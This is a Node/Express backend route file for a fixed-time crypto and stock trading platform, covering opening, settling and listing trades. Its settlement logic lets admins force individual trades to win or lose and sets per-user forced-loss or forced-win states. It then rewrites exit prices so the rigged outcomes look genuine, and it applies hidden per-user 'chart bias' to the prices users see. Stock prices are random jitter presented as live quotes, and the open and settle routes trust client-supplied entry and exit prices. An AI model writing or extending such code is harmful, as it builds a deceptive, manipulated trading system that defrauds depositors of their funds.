/**
 * =============================================================================
 *  NEXUS BACKEND — routes/secondsTrade.js
 * =============================================================================
 *  Fixed-time trading:
 *    POST   /open
 *    GET    /active
 *    GET    /history
 *    POST   /settle/:id
 *    GET    /markets          — reference live prices (proxy + bias)
 * =============================================================================
 */

import { Router } from "express";
import { body, param, validationResult } from "express-validator";
import mongoose from "mongoose";

import User from "../models/User.js";
import SecondsTrade from "../models/SecondsTrade.js";
import Transaction from "../models/Transaction.js";
import { requireAuth } from "../middleware/auth.js";

const router = Router();

const DEFAULT_PAYOUT = 85;
const MIN_DURATION = 10;
const MAX_DURATION = 3600;

const CRYPTO_ASSETS = ["BTC", "ETH", "SOL", "BNB", "XRP"];
const STOCK_ASSETS = ["AAPL", "TSLA", "AMZN", "NVDA", "GOOGL"];

/** Fallback reference prices when external feed is unavailable */
const FALLBACK_PRICES = {
  BTC: 68000,
  ETH: 3500,
  SOL: 145,
  BNB: 580,
  XRP: 0.62,
  AAPL: 210,
  TSLA: 250,
  AMZN: 190,
  NVDA: 120,
  GOOGL: 175,
};

const asyncHandler = (fn) => (req, res, next) =>
  Promise.resolve(fn(req, res, next)).catch(next);

const sendValidationError = (res, errors) =>
  res.status(422).json({
    success: false,
    error: "ValidationError",
    message: "One or more fields are invalid.",
    details: errors.array().map((e) => ({
      field: e.path || e.param,
      message: e.msg,
    })),
  });

const requireDatabase = (_req, res, next) => {
  if (mongoose.connection.readyState !== 1) {
    return res.status(503).json({
      success: false,
      error: "ServiceUnavailable",
      message: "Database is offline. Trading is temporarily disabled.",
    });
  }
  return next();
};

const walletToObject = (wallet) => {
  if (!wallet) return {};
  if (wallet instanceof Map) return Object.fromEntries(wallet);
  return { ...wallet };
};

const serializeTrade = (t) => {
  const doc = typeof t.toObject === "function" ? t.toObject() : t;
  const now = Date.now();
  const expiresAt = new Date(doc.expiresAt).getTime();
  const remainingSec = Math.max(0, Math.ceil((expiresAt - now) / 1000));
  return {
    ...doc,
    remainingSec,
    isExpired: remainingSec <= 0 && doc.status === "open",
  };
};

async function fetchLivePrice(asset) {
  const sym = String(asset).toUpperCase();
  if (CRYPTO_ASSETS.includes(sym)) {
    try {
      const pair = `${sym}USDT`;
      const ctrl = AbortSignal.timeout(4000);
      const res = await fetch(
        `https://api.binance.com/api/v3/ticker/price?symbol=${pair}`,
        { signal: ctrl }
      );
      if (res.ok) {
        const data = await res.json();
        const price = Number(data.price);
        if (Number.isFinite(price) && price > 0) return price;
      }
    } catch {
      /* fall through */
    }
  }
  // Stocks / fallback — mild random walk around seed
  const base = FALLBACK_PRICES[sym] || 100;
  const jitter = 1 + (Math.random() - 0.5) * 0.004;
  return Number((base * jitter).toFixed(sym === "XRP" ? 4 : 2));
}

function applyBias(price, biasPercent) {
  const b = Number(biasPercent) || 0;
  return price * (1 + b / 100);
}

/**
 * Resolve win/loss for an open trade and credit wallet if won.
 */
export async function settleTrade(tradeId, { exitPriceHint } = {}) {
  const trade = await SecondsTrade.findById(tradeId);
  if (!trade || trade.status !== "open") return trade;

  const user = await User.findById(trade.user);
  if (!user) return trade;

  let exitPrice =
    exitPriceHint != null
      ? Number(exitPriceHint)
      : await fetchLivePrice(trade.asset);
  exitPrice = applyBias(exitPrice, trade.priceBiasPercent);

  // Outcome priority: per-trade forced → user sticky control → market
  let outcome = null;
  let reason = "market";

  if (trade.forcedOutcome === "win" || trade.forcedOutcome === "loss") {
    outcome = trade.forcedOutcome;
    reason = "admin_force";
  } else if (user.tradeControlState === "force_win") {
    outcome = "win";
    reason = "user_force_win";
  } else if (user.tradeControlState === "force_loss") {
    outcome = "loss";
    reason = "user_force_loss";
  } else {
    const rose = exitPrice >= trade.entryPrice;
    const won =
      (trade.direction === "long" && rose) ||
      (trade.direction === "short" && !rose);
    outcome = won ? "win" : "loss";
    reason = "market";
  }

  // If admin forced win/loss, nudge exit price for display consistency
  if (outcome === "win") {
    if (trade.direction === "long" && exitPrice < trade.entryPrice) {
      exitPrice = trade.entryPrice * 1.002;
    }
    if (trade.direction === "short" && exitPrice > trade.entryPrice) {
      exitPrice = trade.entryPrice * 0.998;
    }
  } else {
    if (trade.direction === "long" && exitPrice >= trade.entryPrice) {
      exitPrice = trade.entryPrice * 0.998;
    }
    if (trade.direction === "short" && exitPrice <= trade.entryPrice) {
      exitPrice = trade.entryPrice * 1.002;
    }
  }

  let payout = 0;
  const usdt = user.wallet.get("USDT") || 0;

  if (outcome === "win") {
    const profit = trade.stake * ((trade.payoutPercent || DEFAULT_PAYOUT) / 100);
    payout = trade.stake + profit;
    user.wallet.set("USDT", usdt + payout);
    await user.save();
    await Transaction.create({
      user: user._id,
      kind: "trade",
      side: trade.direction === "long" ? "buy" : "sell",
      symbol: trade.asset,
      amount: trade.stake,
      usdValue: payout,
      status: "completed",
      reviewerNote: `Seconds trade WIN (+${trade.payoutPercent}%) · ${reason}`,
    });
  } else {
    await Transaction.create({
      user: user._id,
      kind: "trade",
      side: trade.direction === "long" ? "buy" : "sell",
      symbol: trade.asset,
      amount: trade.stake,
      usdValue: 0,
      status: "completed",
      reviewerNote: `Seconds trade LOSS · ${reason}`,
    });
  }

  trade.status = outcome === "win" ? "won" : "lost";
  trade.exitPrice = exitPrice;
  trade.payout = payout;
  trade.settledAt = new Date();
  trade.settleReason = reason;
  await trade.save();

  return trade;
}

/** Background settler — call from server bootstrap */
export async function settleExpiredTrades() {
  if (mongoose.connection.readyState !== 1) return 0;
  const now = new Date();
  const expired = await SecondsTrade.find({
    status: "open",
    expiresAt: { $lte: now },
  }).limit(50);
  for (const t of expired) {
    try {
      await settleTrade(t._id);
    } catch (err) {
      console.error("[seconds-trade] settle failed", t._id, err?.message);
    }
  }
  return expired.length;
}

// ---------------------------------------------------------------------------
// GET /markets
// ---------------------------------------------------------------------------
router.get(
  "/markets",
  requireAuth,
  asyncHandler(async (req, res) => {
    const user = await User.findById(req.auth.sub).select("chartBias");
    const biasMap = walletToObject(user?.chartBias);

    const assets = [
      ...CRYPTO_ASSETS.map((a) => ({ asset: a, assetType: "crypto" })),
      ...STOCK_ASSETS.map((a) => ({ asset: a, assetType: "stock" })),
    ];

    const prices = await Promise.all(
      assets.map(async ({ asset, assetType }) => {
        const raw = await fetchLivePrice(asset);
        const bias = Number(biasMap[asset] || 0);
        const display = applyBias(raw, bias);
        return {
          asset,
          assetType,
          price: display,
          rawPrice: raw,
          biasPercent: bias,
        };
      })
    );

    // Open trades biases for this user (overlay on matching assets)
    const open = await SecondsTrade.find({
      user: req.auth.sub,
      status: "open",
    }).select("asset priceBiasPercent");

    const tradeBias = {};
    for (const t of open) {
      tradeBias[t.asset] =
        (tradeBias[t.asset] || 0) + Number(t.priceBiasPercent || 0);
    }

    const merged = prices.map((p) => {
      const extra = tradeBias[p.asset] || 0;
      if (!extra) return p;
      const totalBias = p.biasPercent + extra;
      return {
        ...p,
        biasPercent: totalBias,
        price: applyBias(p.rawPrice, totalBias),
      };
    });

    res.json({ success: true, markets: merged, serverTime: new Date().toISOString() });
  })
);

// ---------------------------------------------------------------------------
// POST /open
// ---------------------------------------------------------------------------
router.post(
  "/open",
  requireAuth,
  requireDatabase,
  [
    body("asset").isString().trim().isLength({ min: 2, max: 12 }),
    body("direction").isIn(["long", "short"]),
    body("stake").isFloat({ gt: 0 }),
    body("durationSec").isInt({ min: MIN_DURATION, max: MAX_DURATION }),
    body("entryPrice").optional().isFloat({ gt: 0 }),
  ],
  asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return sendValidationError(res, errors);

    const asset = String(req.body.asset).toUpperCase();
    const direction = req.body.direction;
    const stake = Number(req.body.stake);
    const durationSec = Number(req.body.durationSec);
    const assetType = STOCK_ASSETS.includes(asset)
      ? "stock"
      : CRYPTO_ASSETS.includes(asset)
        ? "crypto"
        : null;

    if (!assetType) {
      return res.status(400).json({
        success: false,
        error: "BadRequestError",
        message: `Unsupported asset. Allowed: ${[...CRYPTO_ASSETS, ...STOCK_ASSETS].join(", ")}`,
      });
    }

    const user = await User.findById(req.auth.sub);
    if (!user) {
      return res.status(404).json({
        success: false,
        error: "NotFoundError",
        message: "User not found.",
      });
    }
    if (user.banned) {
      return res.status(403).json({
        success: false,
        error: "ForbiddenError",
        message: "Account is suspended.",
      });
    }

    const usdt = user.wallet.get("USDT") || 0;
    if (usdt < stake) {
      return res.status(400).json({
        success: false,
        error: "InsufficientFunds",
        message: `Need ${stake} USDT — wallet has ${usdt.toFixed(2)}.`,
      });
    }

    let entryPrice = Number(req.body.entryPrice);
    if (!Number.isFinite(entryPrice) || entryPrice <= 0) {
      entryPrice = await fetchLivePrice(asset);
    }
    const chartBias = Number(user.chartBias?.get?.(asset) || user.chartBias?.[asset] || 0);
    entryPrice = applyBias(entryPrice, chartBias);

    user.wallet.set("USDT", usdt - stake);
    await user.save();

    const openedAt = new Date();
    const expiresAt = new Date(openedAt.getTime() + durationSec * 1000);

    const trade = await SecondsTrade.create({
      user: user._id,
      asset,
      assetType,
      direction,
      stake,
      durationSec,
      entryPrice,
      payoutPercent: DEFAULT_PAYOUT,
      openedAt,
      expiresAt,
      status: "open",
    });

    await Transaction.create({
      user: user._id,
      kind: "trade",
      side: direction === "long" ? "buy" : "sell",
      symbol: asset,
      amount: stake,
      usdValue: stake,
      status: "completed",
      reviewerNote: `Seconds trade OPEN ${direction.toUpperCase()} ${durationSec}s`,
    });

    res.status(201).json({
      success: true,
      trade: serializeTrade(trade),
      user: {
        id: user._id,
        wallet: walletToObject(user.wallet),
      },
    });
  })
);

// ---------------------------------------------------------------------------
// GET /active
// ---------------------------------------------------------------------------
router.get(
  "/active",
  requireAuth,
  requireDatabase,
  asyncHandler(async (req, res) => {
    // Opportunistic settle
    const due = await SecondsTrade.find({
      user: req.auth.sub,
      status: "open",
      expiresAt: { $lte: new Date() },
    }).limit(20);
    for (const t of due) {
      await settleTrade(t._id);
    }

    const trades = await SecondsTrade.find({
      user: req.auth.sub,
      status: "open",
    }).sort({ openedAt: -1 });

    res.json({
      success: true,
      trades: trades.map(serializeTrade),
      serverTime: new Date().toISOString(),
    });
  })
);

// ---------------------------------------------------------------------------
// GET /history
// ---------------------------------------------------------------------------
router.get(
  "/history",
  requireAuth,
  requireDatabase,
  asyncHandler(async (req, res) => {
    const trades = await SecondsTrade.find({
      user: req.auth.sub,
      status: { $in: ["won", "lost", "cancelled"] },
    })
      .sort({ settledAt: -1, createdAt: -1 })
      .limit(100);

    res.json({ success: true, trades: trades.map(serializeTrade) });
  })
);

// ---------------------------------------------------------------------------
// POST /settle/:id
// ---------------------------------------------------------------------------
router.post(
  "/settle/:id",
  requireAuth,
  requireDatabase,
  [param("id").isMongoId()],
  asyncHandler(async (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) return sendValidationError(res, errors);

    const trade = await SecondsTrade.findById(req.params.id);
    if (!trade || String(trade.user) !== String(req.auth.sub)) {
      return res.status(404).json({
        success: false,
        error: "NotFoundError",
        message: "Trade not found.",
      });
    }

    if (trade.status !== "open") {
      return res.json({ success: true, trade: serializeTrade(trade) });
    }

    // Allow settle only at/after expiry (2s grace for clock skew)
    if (Date.now() + 2000 < new Date(trade.expiresAt).getTime()) {
      return res.status(400).json({
        success: false,
        error: "TooEarly",
        message: "Trade has not expired yet.",
        trade: serializeTrade(trade),
      });
    }

    const settled = await settleTrade(trade._id, {
      exitPriceHint: req.body?.exitPrice,
    });
    const user = await User.findById(req.auth.sub);

    res.json({
      success: true,
      trade: serializeTrade(settled),
      user: user
        ? { id: user._id, wallet: walletToObject(user.wallet) }
        : null,
    });
  })
);

export default router;
export { CRYPTO_ASSETS, STOCK_ASSETS, FALLBACK_PRICES, fetchLivePrice };
